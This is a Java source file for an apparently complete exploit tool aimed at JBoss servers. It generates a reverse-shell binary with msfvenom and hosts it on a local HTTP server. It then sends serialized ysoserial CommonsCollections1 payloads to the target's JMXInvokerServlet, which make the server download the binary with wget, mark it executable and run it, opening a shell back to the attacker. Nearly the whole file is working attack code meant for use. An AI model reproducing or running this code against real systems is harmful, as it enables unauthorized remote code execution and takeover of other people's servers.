package jbossexploit2;

import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.CommandLineParser;
import org.apache.commons.cli.DefaultParser;
import org.apache.commons.cli.Options;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpEntityEnclosingRequestBase;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutput;
import java.io.ObjectOutputStream;
import java.net.URI;
import java.util.Random;

public class Main {

    public static void main(String[] args) {
        Random rng = new Random();
        String binaryName = generateString(rng);

        // Parse arguments
        CommandLine cmd = parseArguments(args);
        String rhost = cmd.getOptionValue("rhost");
        int rport = Integer.parseInt(cmd.getOptionValue("rport"));
        String lhost = cmd.getOptionValue("lhost");
        int hport = Integer.parseInt(cmd.getOptionValue("hport"));
        int wport = Integer.parseInt(cmd.getOptionValue("wport"));

        System.out.println("Generating reverse shell binary with msfvenom at /tmp/" + binaryName + "...");
        Msfvenom.generateBinary(lhost, hport, binaryName);

        System.out.println("Starting HTTP Server...");
        hostFile(wport);

        System.out.println("Sending serialized commands...");
        int stage;
        for (stage = 0; stage < 3; stage++) {
            System.out.println("Sending stage " + stage);
            sendPayload(stage, rhost, rport, lhost, wport, binaryName);
        }
    }


    public static void sendPayload(int stage, String rhost, int rport, String lhost, int wport, String binaryName) {
        ysoserial.GeneratePayload ysoserial = new ysoserial.GeneratePayload();
        String command = null;

        switch (stage) {
            case 0:
                command = "wget -O /tmp/" + binaryName + " http://" + lhost + ":" + wport + "/" + binaryName;
                break;

            case 1:
                command = "chmod +x /tmp/" + binaryName;
                break;

            case 2:
                command = "/tmp/" + binaryName;
                break;
        }

        Object payload = ysoserial.generate("CommonsCollections1", command);


        String url = "http://" + rhost + ":" + rport + "/invoker/JMXInvokerServlet";

        DefaultHttpClient httpClient = new DefaultHttpClient();
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutput out = null;
        byte[] payloadBytes = null;
        try {
            out = new ObjectOutputStream(bos);
            out.writeObject(payload);
            payloadBytes = bos.toByteArray();
        } catch (Exception e) {
            System.out.println("Error converting payload to byte array.");
            System.exit(1);
        }
        HttpEntity entity = new ByteArrayEntity(payloadBytes);
        HttpGetWithEntity e = new HttpGetWithEntity();
        e.setEntity(entity);
        e.addHeader("Host", rhost + ":" + rport);
        URI uri = null;
        try {
            uri = new URI(url);
        } catch (Exception ex) {
            System.out.println("Error parsing URL.");
            System.exit(1);
        }
        e.setURI(uri);

        try {
            HttpResponse response = httpClient.execute(e);
        } catch (Exception ex1) {
            System.out.println("Error reading response.");
            System.exit(1);
        }
    }

    public static String generateString(Random rng) {
        char[] text = new char[8];
        String characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        for (int i = 0; i < 8; i++) {
            text[i] = characters.charAt(rng.nextInt(characters.length()));
        }

        return new String(text);
    }

    public static CommandLine parseArguments(String[] args) {
        Options options = new Options();

        // Set up CLI options
        options.addOption("rhost", true, "Target Host IP");
        options.addOption("rport", true, "Remote JBoss Port");
        options.addOption("lhost", true, "Local IP for Target to Connect To");
        options.addOption("hport", true, "Local Handler Port for MSF Handler");
        options.addOption("wport", true, "Local Port for HTTP Server");

        CommandLineParser parser = new DefaultParser();
        CommandLine cmd = null;
        try {
            cmd = parser.parse(options, args);
        } catch (Exception e) {
            System.out.println("Error parsing arguments.");
            System.exit(1);
        }

        return cmd;
    }

    public static void hostFile(int wport) {
        final int port = wport;
        final HttpFileServer server = new HttpFileServer();

        new Thread() {
            @Override
            public void run() {
                try {
                    server.main(port);
                } catch (Exception e) {
                    System.out.println("Could not start HTTP Server.");
                    System.exit(1);
                }
            }
        }.start();
    }

    public static class HttpGetWithEntity extends HttpEntityEnclosingRequestBase {
        public final static String METHOD_NAME = "GET";

        @Override
        public String getMethod() {
            return METHOD_NAME;
        }
    }
}
